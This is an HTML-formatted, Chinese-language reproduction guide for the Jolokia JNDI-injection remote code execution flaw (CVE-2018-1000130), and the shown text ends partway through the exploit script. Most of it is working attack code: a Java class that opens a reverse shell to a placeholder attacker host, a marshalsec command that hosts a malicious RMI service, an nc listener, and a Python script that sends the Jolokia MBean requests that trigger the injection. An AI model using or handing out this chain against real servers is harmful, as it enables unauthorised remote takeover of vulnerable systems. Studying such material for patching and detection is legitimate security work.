<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-1000130jolokia-远程代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-1000130</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Jolokia </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Jolokia</span><span class="cs9C1B1871">服务的代理模式默认情况下在</span><span class="cs8926E06">1.5.0</span><span class="cs9C1B1871">版之前容易受到</span><span class="cs5BEC2C28">JNDI</span><span class="csE3F655E4">注入</span><span class="cs9C1B1871">的攻击。当以代理模式部署</span><span class="cs8926E06">Jolokia</span><span class="cs9C1B1871">代理时，有权访问</span><span class="cs8926E06">Jolokia Web</span><span class="cs9C1B1871">端点的外部攻击者可以通过</span><span class="cs8926E06">JNDI</span><span class="cs9C1B1871">注入攻击远程执行任意代码。由于</span><span class="cs8926E06">Jolokia</span><span class="cs9C1B1871">库使用用户提供的输入启动</span><span class="cs8926E06">LDAP / RMI</span><span class="cs9C1B1871">连接，因此有可能造成这种攻击。</span></p><h4 class="cs868C439D">
			<a name="利用条件"><span class="cs6EDCDAE2">利用条件：</span></a></h4>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs1773D91F"><span class="cs9C1B1871">目标网站存在</span><span class="cs8926E06"> </span><span class="cs9FB05234">/jolokia</span><span class="cs8926E06"> </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> </span><span class="cs9FB05234">/actuator/jolokia</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接口</span></li><li class="cs1773D91F"><span class="cs9C1B1871">目标使用了</span><span class="cs8926E06"> </span><span class="cs9FB05234">jolokia-core</span><span class="cs8926E06"> </span><span class="cs9C1B1871">依赖（版本要求暂未知）并且环境中存在相关</span><span class="cs8926E06"> MBean</span></li><li class="cs1773D91F"><span class="cs9C1B1871">目标可以请求攻击者的服务器（请求可出外网）</span></li><li class="cs1773D91F"><span class="cs9C1B1871">实际测试</span><span class="cs8926E06"> RMI </span><span class="cs9C1B1871">注入受目标</span><span class="cs8926E06"> JDK </span><span class="cs9C1B1871">版本影响，</span><span class="cs8926E06">jdk &lt; 6u141/7u131/8u121</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Jolokia &lt; 1.50</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h4 class="cs868C439D">
			<a name="漏洞分析"><span class="cs6EDCDAE2">漏洞分析</span></a></h4>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs9C1B1871">利用</span><span class="cs8926E06"> jolokia </span><span class="cs9C1B1871">调用</span><span class="cs8926E06"> createJNDIRealm </span><span class="cs9C1B1871">创建</span><span class="cs8926E06"> JNDIRealm</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">设置</span><span class="cs8926E06"> connectionURL </span><span class="cs9C1B1871">地址为</span><span class="cs8926E06"> RMI Service URL</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">设置</span><span class="cs8926E06"> contextFactory </span><span class="cs9C1B1871">为</span><span class="cs8926E06"> RegistryContextFactory</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">停止</span><span class="cs8926E06"> Realm</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">启动</span><span class="cs8926E06"> Realm </span><span class="cs9C1B1871">以触发指定</span><span class="cs8926E06"> RMI </span><span class="cs9C1B1871">地址的</span><span class="cs8926E06"> JNDI </span><span class="cs9C1B1871">注入，造成</span><span class="cs8926E06"> RCE </span><span class="cs9C1B1871">漏洞</span></li></ol>
		<h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<h5 class="cs868C439D">
			<a name="步骤一查看已存在的-mbeans"><span class="cs1C2E50E7">步骤一：查看已存在的</span><span class="cs4B51D5E4"> MBeans</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">/jolokia/list</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接口，查看是否存在</span><span class="cs8926E06"> </span><span class="cs9FB05234">type=MBeanFactory</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs9FB05234">createJNDIRealm</span><span class="cs8926E06"> </span><span class="cs9C1B1871">关键词。</span></p><h5 class="cs868C439D">
			<a name="步骤二准备要执行的-java-代码"><span class="cs1C2E50E7">步骤二：准备要执行的</span><span class="cs4B51D5E4"> Java </span><span class="cs1C2E50E7">代码</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要修改脚本里对应的反弹</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">的</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">和端口</span></p><p class="cs3A447A38"><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;javac -source 1.5 -target 1.5 JNDIObject.java</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> *</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * &nbsp;Build By LandGrey</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * */</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.io.File;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.InputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.OutputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.net.Socket;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class JNDIObject {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;static {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String ip = &quot;your-vps-ip&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String port = &quot;443&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String py_path = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] cmd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String[] py_envs = new String[]{&quot;/bin/python&quot;, &quot;/bin/python3&quot;, &quot;/usr/bin/python&quot;, &quot;/usr/bin/python3&quot;, &quot;/usr/local/bin/python&quot;, &quot;/usr/local/bin/python3&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(int i = 0; i &lt; py_envs.length; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String py = py_envs[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(py)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;py_path = py;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (py_path != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(&quot;/bin/bash&quot;)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{py_path, &quot;-c&quot;, &quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((new File(&quot;/bin/bash&quot;)).exists()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;/bin/bash&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;/bin/sh&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = new String[]{&quot;cmd.exe&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket s = new Socket(ip, Integer.parseInt(port));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream pi = p.getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream pe = p.getErrorStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream si = s.getInputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream po = p.getOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream so = s.getOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(!s.isClosed()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(pi.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pi.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(pe.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pe.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(si.available() &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.write(si.read());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(50L);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.exitValue();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.destroy();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}catch (Throwable e){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h5 class="cs868C439D">
			<a name="步骤三架设恶意-rmi-服务"><span class="cs1C2E50E7">步骤三：架设恶意</span><span class="cs4B51D5E4"> rmi </span><span class="cs1C2E50E7">服务</span></a></h5>
		<p class="cs3A447A38"><span class="cs9FB05234">https://github.com/ianxtianxt/marshalsec</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用下面命令架设对应的</span><span class="cs8926E06"> rmi </span><span class="cs9C1B1871">服务：</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389</span></p><h5 class="cs868C439D">
			<a name="步骤四监听反弹-shell-的端口"><span class="cs1C2E50E7">步骤四：监听反弹</span><span class="cs4B51D5E4"> shell </span><span class="cs1C2E50E7">的端口</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">一般使用</span><span class="cs8926E06"> nc </span><span class="cs9C1B1871">监听端口，等待反弹</span><span class="cs8926E06"> shell</span></p><p class="cs3A447A38"><span class="cs9FB05234">nc -lvp </span><span class="cs7FFD2630">上面</span><span class="cs9FB05234">java</span><span class="cs7FFD2630">脚本里面自己设置的端口</span></p><h5 class="cs868C439D">
			<a name="步骤五发送恶意-payload"><span class="cs1C2E50E7">步骤五：发送恶意</span><span class="cs4B51D5E4"> payload</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据实际情况修改</span><span class="cs8926E06"> </span><span class="cs9C1B1871">脚本中的目标地址，</span><span class="cs8926E06">RMI </span><span class="cs9C1B1871">地址、端口等信息，然后在自己控制的服务器上运行。</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># coding: utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">url = &#39;http://127.0.0.1:8080/jolokia&#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">create_realm = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;createJNDIRealm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">wirte_factory = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;WRITE&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;attribute&quot;: &quot;contextFactory&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">write_url = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;WRITE&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;attribute&quot;: &quot;connectionURL&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;value&quot;: 